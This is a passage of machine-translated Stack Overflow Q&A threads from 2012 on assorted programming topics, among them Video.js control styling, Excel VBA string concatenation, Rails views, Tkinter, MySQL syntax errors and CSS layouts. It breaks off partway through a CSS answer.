MDI 子窗口是 MDI 客户端窗口的子窗口，也就是您称为*“剩余区域”*的窗口。因此，它们不能超出窗体父窗口的任何其他窗口，如控制栏、工具栏、面板等。此外，MDI 子窗口不受此 MDI 客户端窗口大小的限制，您可以将 MDI 客户端视为自动滚动窗口。可以移动子窗口以超出任何边缘，并且会出现一个滚动条，以便可以恢复它们的完整视图。

如果我正确理解你想要做什么，你必须最大化子窗口。您可以将`WindowState`子窗口的属性设置`wsMaximized`为该效果。

# html - Videojs只添加播放控制

> ID：13524879
> 
> 赞同：4
> 
> 时间：2012-11-23T07:43:54.383
> 
> 标签：html, html5-video, video.js

我正在使用`Video.js`在我的网页中播放视频。我想将播放器控件自定义为仅播放按钮。

我的代码是

```
<link href="http://vjs.zencdn.net/c/video-js.css" rel="stylesheet">

<script src="http://vjs.zencdn.net/c/video.js"></script>

<video id="my_video_1" class="video-js vjs-default-skin" controls
                    preload="auto" width="320" height="240" poster="thumb.png"
                    data-setup="{}">
                    <source src="v1.mp4" type='video/mp4'>
                    </video> 
```

谁能指导我进行播放器自定义？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-06-28T18:48:36.830

我能够做到这一点的方法是将特定控件的 css 类设置为`display: none;`我页面的 CSS 中。在 video-js.css 被链接后，我的页面的 CSS 被链接。

```
/* Video.js Controls Style Overrides */
.vjs-default-skin .vjs-progress-control,
.vjs-default-skin .vjs-time-controls,
.vjs-default-skin .vjs-time-divider,
.vjs-default-skin .vjs-captions-button,
.vjs-default-skin .vjs-mute-control,
.vjs-default-skin .vjs-volume-control,
.vjs-default-skin .vjs-fullscreen-control {
    display: none;  
} 
```

如果在链接 video-js.css 后您无法链接页面的 CSS，则可以`display: none !important;`改用它，这应该可以解决问题。虽然，我只会使用 !important 作为最后的手段。

注意：一旦点击播放，上述内容不会删除暂停按钮，也不会删除大播放按钮。删除这些时还有更多 UI 考虑因素。希望这将有助于一些人自定义 Video.js 控制栏。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-29T21:25:59.567

我发现最简单的方法是修改类的原型。

插入

```
<script>
    _V_.ControlBar.prototype.options.components = {'playToggle':{}}
</script> 
```

紧接着

```
<script src="http://vjs.zencdn.net/c/video.js"></script> 
```

这将删除播放切换按钮之外的所有控件（包括持续时间、剩余时间和搜索栏）

如果您想要其他东西，您可以从默认设置中进行选择（其中一些设置为隐藏在默认皮肤上）

```
options: {
    components: {
        "playToggle": {},
        "fullscreenToggle": {},
        "currentTimeDisplay": {},
        "timeDivider": {},
        "durationDisplay": {},
        "remainingTimeDisplay": {},
        "progressControl": {},
        "volumeControl": {},
        "muteToggle": {}
    }
} 
```

[或者在 git hub https://github.com/zencoder/video-js/blob/master/src/controls.js](https://github.com/zencoder/video-js/blob/master/src/controls.js)上挖掘controls.js 文件

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-01-08T17:13:35.253

似乎还有一个选项可以通过隐藏/显示 controlBar 项目`data-setup`

组件列在 [https://github.com/videojs/video.js/blob/stable/docs/guides/components.md](https://github.com/videojs/video.js/blob/stable/docs/guides/components.md)
和选项说明[https://github.com/videojs/video.js/blob /stable/docs/guides/options.md](https://github.com/videojs/video.js/blob/stable/docs/guides/options.md)

```
<video data-setup='{ "controls": true, "autoplay": false, "preload": "auto" }'...> 
```

`controlBar`传递如下：

```
data-setup='{ "controlBar": { "muteToggle": false } }' 
```

编辑：正如评论，`children`for的行为`options`已被简化和改变，另见文档：[https](https://github.com/videojs/video.js/blob/master/docs/guides/options.md#component-options) ://github.com/videojs/video.js/blob/master/docs/guides/options.md#component-options For这些更改的背景和时间安排，请参阅[https://github.com/videojs/video.js/issues/953](https://github.com/videojs/video.js/issues/953)

大播放按钮的 CSS 选择器是

```
.vjs-default-skin .vjs-big-play-button 
```

但请确保在删除播放选项时有替代方案或适当的设置 (;

我的似乎默认隐藏控件（？）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-10-30T07:57:35.927

这也删除了所有控制栏，但没有删除大播放按钮

```
.vjs-default-skin.vjs-has-started .vjs-control-bar {
visibility: hidden;
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-01-21T21:38:52.123

如果您还想摆脱播放按钮，而只是让视频播放并在点击时停止，请查看我改编的[这个](https://msdn.microsoft.com/en-us/library/ie/hh924823%28v=vs.85%29.aspx)替代解决方案。

插入您的`<head>`（或其他地方，如果不可能）...

```
<script type="text/javascript">
    function vidplay(me) {
       if (me.paused) {
          me.play();
       } else {
          me.pause();
       }
    }
</script> 
```

然后从您的视频中调用，例如

```
<video onclick="javascript: vidplay(this)" ...> 
```

确保您没有在`video`标签中设置控件。显然，通过这种方式，您可以使用链接解决方案所做的自己的自定义按钮。

# excel - 在Excel中单元格的数据之间插入分号

> ID：13524881
> 
> 赞同：1
> 
> 时间：2012-11-23T07:44:02.583
> 
> 标签：excel, vba, string

我在 A、C、E 和 G 列中有数据。我希望 I 列保存这些数据中的所有数据，用分号分隔，我在网上搜索过，但我发现的只是如何用分号替换换行符，而这并不不要这样做。以下是我尝试使用的 3 段代码

```
Range("I" & i).Value = "=A" & i & Chr(59) & "&" & "C" & i & "&" & "E" & i & "&" & "G" & i
Range("I" & i).Value = "=A" & i & "&C" & i & "&E" & i & "&G" & i
Range("I" & i).Value = Range("A" & i).Value + ; + Range("C" & i).Value + ; + Range("E" & i).Value + ; + Range("G" & i).Value 
```

第二行最接近我想要的但是当我添加 & ";" 进入它我得到错误。

任何想法都非常感谢

已解决：这已通过下面的答案解决，我已经管理了自己的修复程序，我将详细说明，但接受的答案是一种更清洁、更有效的方法

mystring = "=A" & i & "&" & Chr(34) & ";" & Chr(34) & "& C" ​​& i & "&" & Chr(34) & ";" & Chr(34) & "& E" & i & "&" & Chr(34) & ";" & Chr(34) & "& G" & i Range("I" & i).Value = mystring

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T08:49:32.320

你应该使用`"&"";"""`.

详细地说，你应该使用类似的东西

```
"=A" & i & "&"";""" & "&C" & i 
```

这导致

```
=A1&";"&C1 
```

假设`i = 1`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T09:25:14.780

```
=CONCATENATE(A1, ";", C1, ";", E1, ";", G1) 
```

使用 VBA

```
Range("A2").FORMULA = REPLACE("=CONCATENATE(A1, ';', C1, ';', E1, ';', G1)", "'", CHR(34)) 
```

# facebook - 如何从 facebook likebox 隐藏 facebook“社交插件”链接？

> ID：13524882
> 
> 赞同：2
> 
> 时间：2012-11-23T07:44:03.020
> 
> 标签：facebook, facebook-likebox

我想从 facebook like box 中隐藏开发者链接“社交插件”链接，任何人都可以这样做，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-17T14:11:47.133

为了隐藏开发人员链接“社交插件”，我在这里使用了如下的 CSS：给它一个低于实际盒子的高度。然后简单的使用溢出隐藏。我知道它不是很干净，但它有效。

```
.fb-like-box.fb_iframe_widget {

height: 202px;
overflow: hidden;

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:45:48.917

如果您的like box宽度为300px，则使用内联css更改likebox的高度，如下所示

```
style=" height:234px;border-width: 2px;border-style: solid;" 
```

让我知道，这行得通吗

# macos - 如何在 Mac OS 上发布 qt GUI 应用程序？

> ID：13524883
> 
> 赞同：0
> 
> 时间：2012-11-23T07:44:17.183
> 
> 标签：macos, qt, qt-creator, publish

当我尝试使用 qtcreator发布一个简单的**“hello world”之类的 qt 应用程序时，出现以下错误：**

```
Publishing is currently not possible for project 'xxxx'. 
```

我只想创建一个可以在没有 qtcreator 的情况下运行另一个 Mac OS 的应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:28:28.793

您可以使用[macdeployqt](http://qt-project.org/doc/qt-4.8/deployment-mac.html#the-mac-deployment-tool)工具从终端执行此操作。

# c++ - cURL库的使用

> ID：13524884
> 
> 赞同：1
> 
> 时间：2012-11-23T07:44:27.467
> 
> 标签：c++, iphone, ios6

我想编写适用于 iPhone 和 android 的通用代码。为此，我想使用适用于 android 的 cURL 库，但对于 iOS，它给了我以下错误：

```
(null): "_curl_easy_cleanup", referenced from:
(null): "_curl_easy_init", referenced from:
(null): "_curl_easy_perform", referenced from:
(null): "_curl_easy_setopt", referenced from:
(null): "_curl_easy_strerror", referenced from:
(null): Linker command failed with exit code 1 (use -v to see invocation) 
```

上述错误表明 libcurl.a 存在一些链接错误。我无法找到合适的解决方案。请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:59:27.320

您是否在 XCode 中将 libcurl.a 添加到应用程序编译的链接过程中？如果这是 GCC，那就是添加一个类似的标志，`-lcurl`但我不太确定 XCode。

试试这个：
`XCode -> Click on your project -> Your Target -> Build Settings -> Linking -> other Linker flags`- 这里添加`-lcurl`
库的路径可能需要添加`Build Settings -> Search paths -> Library Search Paths`

# facebook - 用于网站的 Facebook 连接和共享应用程序（如 9gag）

> ID：13524885
> 
> 赞同：-2
> 
> 时间：2012-11-23T07:44:39.090
> 
> 标签：facebook, logging, share, facebook-apps

我正在创建一个网站，用户可以在其中预订某些餐厅，我希望整个页面在您登录后与 Facebook 集成。当用户进行预订时，Facebook 将自动在用户 Facebook 上发布预订，以便其他人可能在他们的主页上看到它（就像 9gag 的活动一样）。

任何帮助请！我是一名程序员，但这是我第一次尝试集成 Facebook。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T09:11:33.047

如果您从 Facebook 开始，那么您应该去：

> [https://developers.facebook.com/docs/](https://developers.facebook.com/docs/)

登录：

> [https://developers.facebook.com/docs/concepts/login/](https://developers.facebook.com/docs/concepts/login/)

另请阅读 facebook 的条款和条件，应用程序有一些重要规则。

# ruby-on-rails - 如何在 Rails 3 应用程序上安装/实现 Hudson

> ID：13524890
> 
> 赞同：0
> 
> 时间：2012-11-23T07:45:22.310
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我有一个 ROR 3 应用程序。我需要安装并运行 hudson 以进行连续集成测试。我对 Internet 上的可用资源有点困惑...我需要帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:54:02.850

第一的 ..

1.  从 [hudson 的战争文件][1] 下载 hudson

    在 VMware 中挂载 war 文件（如果您在 Windows 上使用 LInux）或从终端点击此命令`java -jar hudson-2.2.1.war`

    第三步也是最后一步 .. 通过 `http://localhost:8080`...连接到 localhost 并查看 Hudson 正在运行。此外，您可以更改配置设置。此链接将帮助您[http://injecting.by2.be/blog/2010/11/hudson_for_a_rails3_project.html](http://injecting.by2.be/blog/2010/11/hudson_for_a_rails3_project.html)由 Ivo Dancet ...希望对您有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:55:53.673

我和 Jenkins 一起做 CI，它是 Hudson 的一个分支。您可以尝试类似[本指南](http://gistflow.com/posts/492-jenkins-ci-setup-for-rails-application-from-scratch)的内容 - 它涵盖了从上到下的过程。

如果您要使用 AWS，还有像[lobot这样的宝石可以为您自动化大部分流程。](https://github.com/pivotal/lobot)

# php - 如何生成直方图

> ID：13524897
> 
> 赞同：3
> 
> 时间：2012-11-23T07:45:43.887
> 
> 标签：php, imagemagick, histogram

我有一个人们分享照片的网站。我正在生成照片直方图值。我想使用 RGB 的值设计直方图。

如何开发直方图图表？

我期待以图表的形式输出！

```
<?php
$image = new Imagick("thing.png");
$pixels=$image->getImageHistogram();
foreach($pixels as $p){
 $colors = $p->getColor();
 foreach($colors as $c){
        print( "$c\t" );
 }
 print( "\t:\t" . $p->getColorCount() . "\n" );
}
?> 
```

这将打印出如下内容：

```
252    250    252    1    :    125
194    156    182    1    :    126
109    18    79    1    :    11440
2    117    162    1    :    12761
255    255    255    1    :    40769 
```

...其中列是红色，绿色，蓝色，alpha，然后是该颜色在图像中出现的次数。

# ruby-on-rails - Link_to 另一个视图 ruby on rails

> ID：13524900
> 
> 赞同：0
> 
> 时间：2012-11-23T07:45:54.820
> 
> 标签：ruby-on-rails, link-to

我正在尝试使用 link_to 功能将一个视图链接到另一个视图。

我调用 link_to 的视图是 app/views/instructors/show.html.erb 并且该代码片段看起来像这样（即倒数第二行）

```
<% provide(:title, @instructor.login) %>
<% courses = Course.where(:instructor_ID => @instructor.id) %>
    <div class="span2">
      <h1 align=center ><%= @instructor.login %></h1>
      <%= link_to "Add course", new_course_path(:instructor_ID\
                => @instructor.id), :class => "btn" %>
        <br>
        <br>
        <%= link_to "Remove course", delete_course_path(courses), :class => "btn"%>
    </div> 
```

我试图链接到的视图是 app/views/courses/show_all.html.erb，如下所示：

```
<% @courses.each do |course| %>
  <tr>
    <td><%= course.course_name %></td>
    <td><%= course.instructor_ID %></td>
    <td><%= link_to 'Show', course %></td>
    <td><%= link_to 'Edit', edit_course_path(course) %></td>
    <td><%= link_to 'Destroy', course, :method => :delete, :data => { :confirm => 'Are you sure?' } %></td>
  </tr> 
```

delete_course_path 路由到上面显示的 app/views/courses/show_all.html.erb。当我尝试上面的代码时，我收到以下错误：

> nil:NilClass 的未定义方法“每个”

在这一行：

```
<% @courses.each do |course| %> 
```

我的link_to中缺少什么想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:51:07.047

这意味着它`@courses`为零。您是否在`show_all`控制器的操作中设置了它？例如

```
def show_all
  @courses = Course.all
end 
```

此外，在您`show`看来，您设置`courses`为一组`Course`对象，但您的“删除课程”链接看起来您只想删除一门课程。为什么你使用`delete_course`路由链接到你的 show_all 视图？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:53:26.000

在您的`show_all`操作中，您应该定义一个`@courses`实例变量。这是

`<% courses = Course.where(:instructor_ID => @instructor.id) %>`

没有传递给`show_all.html.erb`.

实例变量是从控制器的动作传递到对应的视图的变量。

我想当您显示讲师页面时，您的路线会像这样：`/instructors/:id`，所以也许在您的讲师控制器的 show_all 动作中，您需要类似：

```
def show_all
  @courses = Course.where(instructor_ID: params[:id])
  render 'courses/show_all'
end 
```

# php - Catch "Warning: mysqli::mysqli() [mysqli.mysqli]: MySQL server has gone away" 好好写错误

> ID：13524902
> 
> 赞同：0
> 
> 时间：2012-11-23T07:46:00.673
> 
> 标签：php, mysqli

在哪里以及如何编写代码来检查是否出现显示“MySQL 服务器已消失”的错误，并以不同的方式更好地打印一些错误。

```
Warning: mysqli::mysqli() [mysqli.mysqli]: MySQL server has gone away 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:51:49.890

还有另一篇文章使用以下代码片段回答了这个问题（[解决“MySQL 服务器已消失”错误）：](https://stackoverflow.com/questions/8689649/solving-mysql-server-has-gone-away-errors/8689738#8689738)

```
try {
  $conn = getDbConn();
  saveData($conn, $val);
} catch (DbException $e) {
  if (strstr($e->getMessage(), 'MySQL server has gone away') {
    // WRITE OUT NICE LOG HERE AND RETRY IF WANTED
    ....
    // RETRY
    $conn = getDbConn();
    saveData($conn, $val);
  } else {
    // we have a problem connecting or something, pass the exception along
    throw $e;
  }
} 
```

# c# - 模型转换覆盖率

> ID：13524903
> 
> 赞同：0
> 
> 时间：2012-11-23T07:46:14.420
> 
> 标签：c#

我们最近引入了一个全新的数据模型，从逻辑结构的角度来看，它与我们当前的模型不同。我们还将模型的语言从德语更改为英语，因为我们希望将模型结构作为 XML 开放给我们的客户。

为了能够转换模型，我们实现了显式转换，它基本上将新模型不同类的所有属性匹配到我们的旧模型中。

像这样：

```
private OldModel Convert(NewModel src)
{
  var dst = new OldModel();
  dst.Prop1 = src.SomeOtherProp
  dst.Prop2 = Convert(src.ComplexProp);
  //....
  return dst;
} 
```

现在我们要确保，新模型的所有属性都写入旧模型以进行覆盖和测试。我们还想确保我们没有忘记任何属性，并保证对于未来的模型扩展，我们不会忘记某个属性。

我的想法是解析代码文件，提取从新模型中读取的所有属性，通过反射运行新模型，将它们与其中的实际属性进行比较。

这个解决方案感觉不太好:-)有什么建议吗？

我很感激任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T07:35:11.107

我们最终决定使用如下正则表达式解析代码文件：

```
@"private static [a-zA-Z0-9.]+[ ]+Convert[(][^)]*[)]\s*[{](?<body>[^{}]*(((?<Open>[{])[^{}]*)+((?<Close-Open>[}])[^{}]*)+)*(?(Open)(?!)))[}]"; 
```

它将匹配这样`private static Namespace.ClassName Convert(Namespace.ClassName input)`的方法并提取方法主体。由于转换器方法遵循简单的结构模式，因此很容易提取我需要的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T23:59:12.640

我建议使用像[AutoMapper](https://github.com/AutoMapper/AutoMapper/wiki/Getting-started)这样的映射库。它们允许配置映射、转换器并使用公共属性和特定[方法](https://github.com/AutoMapper/AutoMapper/wiki/Flattening)进行操作。

# javascript - Rails Asset Pipeline Minify 更改 4 字节 Unicode 字符

> ID：13524904
> 
> 赞同：0
> 
> 时间：2012-11-23T07:46:14.847
> 
> 标签：javascript, ruby-on-rails, asset-pipeline, emoji, astral-plane

我正在使用[http://code.kwint.in/emoji/](http://code.kwint.in/emoji/)将 unicode iOS 表情符号字符转换为我的 Rails 应用程序中的图像。

它在开发中运行良好，但是在为生产预编译资产时，unicode 字符代码会发生变化。

例如，它们从`"ðŸ˜„"`到`"ï˜„"`。

我怎样才能防止这种变化发生，因为它破坏了我上面链接的 emoji.js 脚本？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-14T23:21:03.477

这已由 Rails 3.2 的更新版本修复

# javascript - 在 JS 中创建并初始化一个对象

> ID：13524907
> 
> 赞同：0
> 
> 时间：2012-11-23T07:46:19.707
> 
> 标签：javascript

我正在尝试一次性创建和初始化一个对象。所以不要这样做

```
var a = function(){};

a.prototype.blah = function(){return "blah"};

var b  = new a(); 
```

我想用这个。

```
var a = function(){
    return new function init() {
      this.extend = init.prototype;
      this.creator = "Levi";
      this.create = function(){
          return new init();
      }
      // other stuff
    };
  }();

  a.extend.blah = function(){return "blah";}; 
```

有没有更好的方法来做到这一点？我特别不确定`return new function`在我的代码中使用。谢谢！

编辑：只是为了澄清我想用它作为对象原型的一种包装器，我不想使用这样的对象文字`var a = {extend: "",creator: "Levi"}`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:00:16.037

一种替代方法可以是：

```
var a = (function(){

  var A = function() {
    this.creator = "Levi";
  }

  A.prototype.blah = function() {
    return "blah"
  };

  return new A;

})(); 
```

这可能对一次性对象有用，`A`.

# android - 媒体播放器在 Android 版本 >=4.0 中不起作用

> ID：13524909
> 
> 赞同：1
> 
> 时间：2012-11-23T07:46:21.283
> 
> 标签：android, android-mediaplayer

我正在开发一个简单的广播流应用程序来使用 URL 播放广播。此应用程序在除 V>=4.0 之外的所有版本中运行

有没有人对此有任何想法。

```
 initializeUIElements();
    StartPlaying();

     private void initializeUIElements() {

    buttonPlay = (ImageView) findViewById(R.id.buttonPlay);
    buttonPlay.setOnClickListener(this);
    playSeekBar=(ProgressBar)findViewById(R.id.progressBar1);
}

 private void startPlaying() {

    initializeMediaPlayer();
    player.setOnPreparedListener(new OnPreparedListener() {

        public void onPrepared(MediaPlayer mp) {

            Log.i("on prepared", "on prepared");
            mp.start();
        }
    });
    player.setOnErrorListener(new OnErrorListener(){
        public boolean onError(MediaPlayer arg0, int arg1,
            int arg2) {
            Toast.makeText(getApplicationContext(),"An error happened while preparing radio",Toast.LENGTH_LONG).show();
           player.reset();
            initializeMediaPlayer();
        return false;
        } 

});

private void initializeMediaPlayer() {
    player = new MediaPlayer();
   player.reset();
    try {
        player.setAudioStreamType(AudioManager.STREAM_MUSIC);
        player.setDataSource("http://***************");
        player.prepareAsync();

    } catch (IllegalArgumentException e) {
        e.printStackTrace();
    } catch (IllegalStateException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
    catch(Exception e)
    {
        e.printStackTrace();
    }

    player.setOnBufferingUpdateListener(new OnBufferingUpdateListener() {

        public void onBufferingUpdate(MediaPlayer mp, int percent) {

            Log.i("percent", ""+percent);
           if( (percent!=0)||(percent==100) )
           {

               playSeekBar.setVisibility(View.INVISIBLE);
               buttonPlay.setVisibility(View.VISIBLE);
           }

        }
    }); 
```

在 Android 4.0 版中，它给出的错误如下：

```
 11-23 13:06:37.329: E/MediaPlayer(4011): Error (1,-2147483648) 
```

并且 Player.bufferingUpdateListener() 没有被调用。在这里它只是显示 playeekbar 旋转和旋转.. 请帮助解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:55:17.547

这可能是您的特定设备的问题。尝试在 4.0 模拟器上运行相同的。

# python - 为什么我在 Python 中输入这段代码时会得到一个空白的 Tkinter 框？

> ID：13524911
> 
> 赞同：3
> 
> 时间：2012-11-23T07:46:21.937
> 
> 标签：python, tkinter

大部分代码是由我的教授提供的，我必须更改他的格式。但是，当我运行程序时，他的原始代码甚至没有在 tk 框中提供任何内容。我做了一些改变，但没有什么是很有效的。有什么建议吗？？

这是我的主要代码：

```
from Tkinter import *
import todo
master = Tk()

class todoApp():

    def __init__(self, master):
        self.master = master
        self.frame = Frame(master)
        self.frame.grid()
        self.todo = todo.todoList()

        self.saveButton = Button(self.frame, text="Save", command=self.save)
        self.saveButton.grid()
        self.restoreButton = Button(self.frame, text="Restore", command = self.restore)
        self.restoreButton.grid(row=1, column=1)
        self.addButton = Button(self.frame, text="Add", command=self.add)
        self.addButton.grid(row=0,column=2)
        self.doneButton = Button(self.frame, text="Done", command=self.done)
        self.doneButton.grid(row=0,column=3)
        self.button = Button(self.frame, text="Quit", command=self.quit)
        self.button.grid(row=0, column=4)

        label = Label(self.frame, text="New Task: ")
        label.grid()
        self.entry = Entry(self.frame)
        self.entry.grid(row=1, column=1, columnspan=4)

        frame1 = LabelFrame(self.frame, text="Tasks")
        frame1.grid(columnspan=5, sticky=E+W)
        frame1.columnconfigure(0,weight=1)
        self.tasks = Listbox(frame1)
        self.tasks.grid(sticky=E+W)

        frame2 = LabelFrame(self.frame, text="Completed")
        frame2.grid(columnspan=5, sticky=E+W)
        frame2.columnconfigure(0,weight=1)
        self.completed = Listbox(frame2)
        self.completed.grid(sticky=E+W)

    def save(self):
        self.todo.saveList("tasks.txt")

    def restore(self):
        self.todo.restoreList("tasks.txt")
        items = self.todo.getTasks()
        self.tasks.delete(0,END)
        for item in [ "study", "grocery shop", "cram for finals!", "sleep", "build a gingerbread house" ]:
            self.tasks.insert(END,item)
        items = self.todo.getCompleted()
        self.completed.delete(0,END)
        for item in items:
            self.completed.insert(END,item)

    def add(self):
        task = self.entry.get()
        self.todo.addTask(task)
        self.tasks.insert(END,task)

    def done(self):
        selection = self.tasks.curselection()
        if len(selection) == 0:
            return
        task = self.tasks.get(selection[0])
        self.todo.completeTask(task)
        self.tasks.delete(selction[0])
        self.completed.insert(END,task)

    def quit(self):
        self.frame.quit()
        self.master.destroy()

master.mainloop() 
```

`todo`进口是：

```
class todoList:
    def __init__(self):
        self.todo = []
        self.done = []

    def addTask(self,task):
        self.todo.append(task)

    def completeTask(self,task):
        if self.todo.count(task) > 0:
           self.todo.remove(task)
           self.done.append(task)

    def getTasks(self):
        return self.todo

    def getCompleted(self):
        return self.done 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T08:50:12.717

您还没有创建该类的实例`todoApp`，

在此处添加此行：

```
 def quit(self):
    self.frame.quit()
    self.master.destroy()

a = todoApp(master)

master.mainloop() 
```

不过，您确实需要弄乱定位，当我运行它时，它看起来有点乱。

编辑：

这正是你要找的吗？

```
from Tkinter import *
import todo
master = Tk()

class todoApp():

    def __init__(self, master):
        self.master = master
        self.frame = Frame(master)
        self.frame.grid()
        self.todo = todo.todoList()

        self.buttonframe = LabelFrame(self.frame, text='controls')
        self.buttonframe.grid(row=0, column=0, columnspan=2)
        self.saveButton = Button(self.buttonframe, text="Save", command=self.save)
        self.saveButton.grid()
        self.restoreButton = Button(self.buttonframe, text="Restore", command = self.restore)
        self.restoreButton.grid(row=0, column=1)
        self.addButton = Button(self.buttonframe, text="Add", command=self.add)
        self.addButton.grid(row=0,column=2)
        self.doneButton = Button(self.buttonframe, text="Done", command=self.done)
        self.doneButton.grid(row=0,column=3)
        self.button = Button(self.buttonframe, text="Quit", command=self.quit)
        self.button.grid(row=0, column=4)

        label = Label(self.frame, text="New Task: ")
        label.grid(row=1, column=0)
        self.entry = Entry(self.frame)
        self.entry.grid(row=1, column=1)

        frame1 = LabelFrame(self.frame, text="Tasks")
        frame1.grid(columnspan=5, sticky=E+W)
        frame1.columnconfigure(0,weight=1)
        self.tasks = Listbox(frame1)
        self.tasks.grid(sticky=E+W)

        frame2 = LabelFrame(self.frame, text="Completed")
        frame2.grid(columnspan=5, sticky=E+W)
        frame2.columnconfigure(0,weight=1)
        self.completed = Listbox(frame2)
        self.completed.grid(sticky=E+W)

    def save(self):
        self.todo.saveList("tasks.txt")

    def restore(self):
        self.todo.restoreList("tasks.txt")
        items = self.todo.getTasks()
        self.tasks.delete(0,END)
        for item in [ "study", "grocery shop", "cram for finals!", "sleep", "build a gingerbread house" ]:
            self.tasks.insert(END,item)
        items = self.todo.getCompleted()
        self.completed.delete(0,END)
        for item in items:
            self.completed.insert(END,item)

    def add(self):
        task = self.entry.get()
        self.todo.addTask(task)
        self.tasks.insert(END,task)

    def done(self):
        selection = self.tasks.curselection()
        if len(selection) == 0:
            return
        task = self.tasks.get(selection[0])
        self.todo.completeTask(task)
        self.tasks.delete(selection[0])
        self.completed.insert(END,task)

    def quit(self):
        self.frame.quit()
        self.master.destroy()

a = todoApp(master)

master.mainloop() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T08:47:23.913

在我看来，您还没有创建类的实例。

在文件的底部，添加以下内容：

```
myApp = todoApp(master)
master.mainloop() 
```

可能它们必须以相反的顺序排列（我正在工作，所以我现在无法尝试）。

# php - 从两个表中选择时mysql限制错误

> ID：13524912
> 
> 赞同：-2
> 
> 时间：2012-11-23T07:46:22.193
> 
> 标签：php, mysql

尝试向此 sql 添加限制，它在限制之前工作正常，但是一旦我添加限制，我就会收到一条错误消息

您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的“LIMIT 0,10”附近使用正确的语法

我的 sql 是

```
SELECT a.id,a.product_name,a.product_price,a.user_id as product_user_id,b.id as user_id,b.first_name, FROM products as a, customers as b where a.user_id=b.id and a.product_featured='Y' and a.product_status='Active' order by a.id desc limit 0,6 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:55:21.083

您有一个查询错误，不是限制，而是在`FROM`您放置逗号的关键字之前`,`。删除它，您的查询将运行。

你的查询是

```
SELECT a.id,a.product_name,a.product_price,a.user_id as product_user_id,b.id as user_id,b.first_name, FROM products as a, customers as b where a.user_id=b.id and a.product_featured='Y' and a.product_status='Active' order by a.id desc limit 0,6 
```

将其更改为

```
SELECT a.id,a.product_name,a.product_price,a.user_id as product_user_id,b.id as user_id,b.first_name FROM products as a, customers as b where a.user_id=b.id and a.product_featured='Y' and a.product_status='Active' order by a.id desc limit 0,6 
```

删除`,`关键字之前`FROM`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:52:19.163

您将逗号放在错误的位置删除它，然后执行查询：

```
SELECT a.id,a.product_name,a.product_price,a.user_id AS product_user_id,b.id AS user_id,b.first_name**,** FROM products AS a, customers AS b WHERE a.user_id=b.id AND a.product_featured='Y' AND a.product_status='Active' ORDER BY a.id DESC LIMIT 0,6 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:55:28.483

`From`只需删除关键字前的逗号即可。

正确的查询将是

```
SELECT a.id,a.product_name,a.product_price,a.user_id as product_user_id,b.id as user_id,b.first_name FROM products as a, customers as b where a.user_id=b.id and a.product_featured='Y' and a.product_status='Active' order by a.id desc limit 0,6 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T07:55:43.513

解决了，没有意识到已经添加了限制

# css - 3行CSS div设计

> ID：13524918
> 
> 赞同：1
> 
> 时间：2012-11-23T07:46:49.487
> 
> 标签：css, html

我正在尝试在行设计中制作 3 个 div。页眉和页脚具有固定高度的位置。中心 div 扩展以填充空白空间。我已经尝试过，但我得到的最接近的是下面的代码。在页脚 div 上扩展的中心 div 仍然存在问题。

html:

```
<div id='container'>
    <div id='rowOne'>row 1</div>
    <div id='rowTwo'>row 2</div>
    <div id='rowThree'>row 3</div>
</div> 
```

CSS：

```
#rowOne {
    width: 100%;
    height: 50px;
    background: green;
}
#rowTwo {
    width: 100%;
    background: limegreen;
    height:100%;
    overflow:hidden;
}
#rowThree {
    width: 100%;
    position: fixed;
    clear: both;
    background: green;
    position:absolute;
    bottom:0;
    left:0;
    height:50px;
}
#container {
    height: 100%;
} 
```

![在此处输入图像描述](../Images/7bb7e992140bf31482214a3fae573ca4.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T12:10:56.743

三行纯 CSS

我知道这篇文章有点进展，但尽管有相反的说法，你可以用 CSS 非常简单地做到这一点。不需要 JavaScript、jQuery、CSS 3 hacks 等。

这是几个显示固定页眉和页脚以及动态主体 div 的 jsf。

第一个显示固定像素高度的页眉和页脚以及动态主体，**完全**符合您在图像中的需要

[http://jsfiddle.net/LBQ7K/](http://jsfiddle.net/LBQ7K/)

```
<body>
<div class="header"><p>Header</p></div>
<div class="cssBody"><p>Hello World</p></div>
<div class="footer"><p>Footer</p></div>
</body>

html, body, {
height: 100%;
}

.header {
position:   absolute;
top:    0px;
height:     50px;
width:      100%;
background: #f00;
}

.footer {
position:   absolute;
bottom: 0;
height:     50px;
width:      100%;
background: #00f;
}

.cssBody {
